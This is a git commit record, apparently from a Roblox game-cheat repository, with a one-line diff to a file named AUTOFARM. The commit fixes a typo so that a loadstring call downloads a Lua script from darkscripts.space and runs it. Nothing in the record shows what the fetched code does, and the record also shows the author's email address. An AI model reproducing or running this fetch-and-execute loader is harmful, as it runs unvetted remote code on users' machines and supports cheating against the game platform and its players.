8418ba345f6a3415e54fa8873751508a6bf070fa
justcallmekane <makmakmakjericson@gmail.com>
2025-01-14 08:34:52 +0800

    Update AUTOFARM%20.lua

--- AUTOFARM%20.lua
+++ AUTOFARM%20.lua
@@ -1,1 +1,1 @@
-oadstring(game:HttpGet('https://darkscripts.space/scripts/07a5e00d-5608-458a-a97d-ea579463e04c_1202113706104987728.lua',true))(
+loadstring(game:HttpGet('https://darkscripts.space/scripts/07a5e00d-5608-458a-a97d-ea579463e04c_1202113706104987728.lua',true))()
